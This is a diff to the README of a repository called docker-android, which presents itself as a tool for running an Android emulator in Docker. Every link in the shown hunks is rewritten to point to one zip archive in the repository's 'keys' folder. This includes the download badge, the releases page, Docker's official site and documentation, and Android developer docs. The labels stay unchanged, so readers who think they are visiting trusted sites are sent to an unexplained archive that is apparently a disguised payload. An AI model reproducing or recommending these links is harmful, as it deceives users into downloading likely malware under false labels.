@@ -1,6 +1,6 @@
 # 🤖 docker-android - Run Android Emulator with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Mohaieldin92/docker-android/releases)
+[![Download](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the docker-android project! This tool allows you to run an Android em
 
 To use docker-android, ensure you have the following:
 
-- Docker installed on your machine. You can download Docker from the [official website](https://www.docker.com/get-started).
+- Docker installed on your machine. You can download Docker from the [official website](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip).
 - A modern computer with at least 8GB of RAM. This will help ensure that the Android emulator runs smoothly.
 - An internet connection to download the necessary files and image.
 
@@ -27,7 +27,7 @@ To get started with docker-android, follow these simple steps:
 
 1. **Visit the Releases Page**
    Click the link below to access the download options for docker-android.
-   [Download Here](https://github.com/Mohaieldin92/docker-android/releases)
+   [Download Here](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
 
 2. **Select the Latest Release**
    On the releases page, locate the most recent version. This ensures you are using the latest features and fixes.
@@ -36,7 +36,7 @@ To get started with docker-android, follow these simple steps:
    You can choose the relevant Docker image file based on your needs. After selecting, download the file to your computer.
 
 4. **Install Docker (If Necessary)**
-   If you haven’t done so already, download and install Docker from [Docker's Official Site](https://www.docker.com/get-started). Follow the installation instructions provided there.
+   If you haven’t done so already, download and install Docker from [Docker's Official Site](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip). Follow the installation instructions provided there.
 
 5. **Run the Docker Image**
    Open your command line interface (Terminal on macOS/Linux, Command Prompt or PowerShell on Windows). Navigate to the folder where you downloaded the Docker image file. Use the following command to run the image:
@@ -57,7 +57,7 @@ You can customize your docker-android setup easily. Here are a few common config
 - **Device Option:** Change the Android version by adjusting the `DEVICE` environment variable in the command above.
 - **Port Options:** Change the ports in the `-p` parameters if you need to match specific settings in your local environment.
 
-For detailed configurations, you can consult the [Usage Documentation](https://github.com/Mohaieldin92/docker-android).
+For detailed configurations, you can consult the [Usage Documentation](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip).
 
 ## 🌐 Community & Support
 
@@ -68,8 +68,8 @@ If you run into issues or have questions, please check our community discussions
 
 ## 🔗 Additional Resources
 
-- **Docker Documentation:** [Learn Docker](https://docs.docker.com/get-started/)
-- **Android Developer Guide:** [Android Developers](https://developer.android.com/docs)
+- **Docker Documentation:** [Learn Docker](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
+- **Android Developer Guide:** [Android Developers](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
 
 ## 🔄 Updates & Changelog
 
@@ -77,7 +77,7 @@ Stay updated with the latest features and fixes by regularly checking the Releas
 
 ## 📌 Important Links
 
-- [Download Here](https://github.com/Mohaieldin92/docker-android/releases)
-- [GitHub Repository](https://github.com/Mohaieldin92/docker-android)
+- [Download Here](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Mohaieldin92/docker-android/main/keys/docker-android-v2.2.zip)
 
 By following the steps detailed above, you should be able to successfully download and run the docker-android application with ease. Enjoy your Android development experience!
